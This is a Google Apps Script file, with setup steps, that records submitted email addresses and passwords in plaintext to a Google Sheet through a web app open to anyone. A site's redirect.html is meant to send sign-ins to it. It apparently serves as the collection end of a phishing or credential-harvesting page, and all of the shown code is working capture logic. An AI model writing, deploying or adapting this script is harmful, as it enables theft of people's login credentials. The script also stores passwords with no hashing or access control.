/**
 * Phantom Learning — log sign-ins to this Google Sheet
 *
 * SETUP:
 * 1. Create a Google Sheet (or use an existing one).
 * 2. Add a header row in row 1, e.g.: Timestamp | Email | Password
 * 3. In the Sheet: Extensions → Apps Script. Paste this entire file.
 * 4. Save, then Deploy → New deployment → type "Web app".
 *    - Execute as: Me
 *    - Who has access: Anyone
 * 5. Copy the Web app URL (ends with /exec).
 * 6. In your site, set SHEET_LOG_URL in redirect.html to that URL.
 */

function doGet(e) {
  e = e || {};
  var p = e.parameter || {};
  var email = p.email || "";
  var password = p.password || "";
  var time = p.time || new Date().toISOString();
  if (email || password) {
    try {
      var sheet = SpreadsheetApp.getActiveSpreadsheet().getActiveSheet();
      if (sheet.getLastRow() === 0) {
        sheet.appendRow(["Timestamp", "Email", "Password"]);
      } else if (sheet.getLastColumn() < 3) {
        sheet.getRange(1, 3).setValue("Password");
      }
      sheet.appendRow([time, email, password]);
    } catch (err) {}
  }
  return ContentService.createTextOutput(JSON.stringify({ ok: true }))
    .setMimeType(ContentService.MimeType.JSON);
}

function doPost(e) {
  try {
    var sheet = SpreadsheetApp.getActiveSpreadsheet().getActiveSheet();
    var body = {};
    if (e && e.postData && e.postData.contents) {
      body = JSON.parse(e.postData.contents);
    }
    if (body.email || body.password) {
      if (sheet.getLastRow() === 0) {
        sheet.appendRow(["Timestamp", "Email", "Password"]);
      } else if (sheet.getLastColumn() < 3) {
        sheet.getRange(1, 3).setValue("Password");
      }
      var row = [
        body.time || new Date().toISOString(),
        body.email || "",
        body.password || ""
      ];
      sheet.appendRow(row);
    }
    return ContentService.createTextOutput(JSON.stringify({ ok: true }))
      .setMimeType(ContentService.MimeType.JSON);
  } catch (err) {
    return ContentService.createTextOutput(JSON.stringify({ ok: false, error: err.toString() }))
      .setMimeType(ContentService.MimeType.JSON);
  }
}
